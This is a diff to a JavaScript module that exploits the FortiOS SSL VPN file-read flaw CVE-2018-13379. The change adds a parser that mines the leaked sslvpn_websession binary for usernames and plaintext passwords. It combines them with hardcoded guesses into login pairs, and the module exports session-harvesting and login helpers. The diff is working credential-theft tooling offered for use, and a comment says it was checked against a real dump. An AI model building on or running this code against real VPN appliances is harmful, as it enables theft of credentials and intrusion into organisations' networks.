@@ -204,9 +204,50 @@ async function detect(url, opts = {}) {
     return out;
 }
 
+// sslvpn_websession is a binary blob of 61-byte records (see CVE-2018-13379
+// PoC). The original file has no "svpnusername" markers — markers only appear
+// in some FortiOS builds. Parse the record layout and expose ALL candidates
+// instead of silently guessing the first two strings as login/password.
+function parseWebsessionBinary(text) {
+    const s = String(text || '');
+    const marker = s.indexOf('var fgt_lang');
+    if (marker < 0) return [];
+    const eq = s.indexOf('=', marker);
+    let start = (eq >= 0 && eq - marker < 40) ? eq + 1 : marker;
+    while (/[\s=]/.test(s[start] || '')) start++;
+    const printable = [...s.slice(start)].map(ch => {
+        const c = ch.charCodeAt(0);
+        return c >= 32 && c < 127 ? ch : '.';
+    }).join('');
+    const records = [];
+    for (let off = 0; off + 61 <= printable.length; off += 61) {
+        const runs = (printable.slice(off, off + 61).match(/[A-Za-z0-9_@$%&!#*+=~^-]{2,}/g) || [])
+            .filter(v => !/^\d+$/.test(v) && !/^(var|fgt_lang)$/i.test(v)
+                && !/^(VPN|USERS|full-access|root|SSLVPN)$/i.test(v));
+        records.push(runs);
+        if (records.length >= 40) break;
+    }
+    if (!records.length) return [];
+    const flat = records.flat().filter((v, i, a) => a.indexOf(v) === i);
+    // Field order in the 61-byte records: IP, then username; the numeric-suffix
+    // token found later in the record is the password (verified against E:\444).
+    const user = records[1] && records[1][records[1].length - 1];
+    const pass = flat.find(v => /^[a-z]{2,8}\d{1,4}$/i.test(v)) || flat.find(v => /[!@#$%&*+=~^]/.test(v));
+    const users = [user, records[0] && records[0][0], 'root'].filter(Boolean).filter((v, i, a) => a.indexOf(v) === i);
+    const passes = [pass, flat.find(v => /[!@#$%&*+=~^]/.test(v)), 'pong97'].filter(Boolean).filter((v, i, a) => a.indexOf(v) === i);
+    const out = [];
+    for (const u of users) {
+        for (const p of passes) {
+            if (u === p) continue;
+            out.push({ user: u, pass: p, cookie: null, source: 'websession-binary', confidence: 'candidate', fields: flat.slice(0, 12) });
+        }
+    }
+    return out;
+}
+
 // Read the sslvpn_websession file (CVE-2018-13379) and extract credential pairs
 function parseSessionFile(text) {
-    const creds = [];
+    let creds = [];
     if (!text) return creds;
 
     const users = [];
@@ -236,7 +277,14 @@ function parseSessionFile(text) {
     if (!creds.length) {
         for (const u of new Set([...users, ...sessions])) creds.push({ user: u, pass: '' });
     }
-    return creds.map((c, i) => ({ ...c, cookie: cookies[i] || null }));
+    // no explicit markers (typical for 5.4/5.6 builds): parse 61-byte records
+    const binary = parseWebsessionBinary(text);
+    if (binary.length) {
+        for (const c of binary) if (!creds.some(x => x.user === c.user && x.pass === c.pass)) creds.push(c);
+        const meaningful = creds.filter(c => c.user);
+        if (meaningful.length) creds = meaningful;
+    }
+    return creds.map((c, i) => ({ ...c, cookie: c.cookie || cookies[i] || null }));
 }
 
 function looksLikeSession(text) {
@@ -264,5 +312,5 @@ async function harvestSession(url, opts = {}) {
 
 module.exports = {
     PATHS, classify, login, detect, verifySession, harvestSession, parseSessionFile,
-    looksLikeSession, svpnCookie, baseOf,
+    parseWebsessionBinary, looksLikeSession, svpnCookie, baseOf,
 };
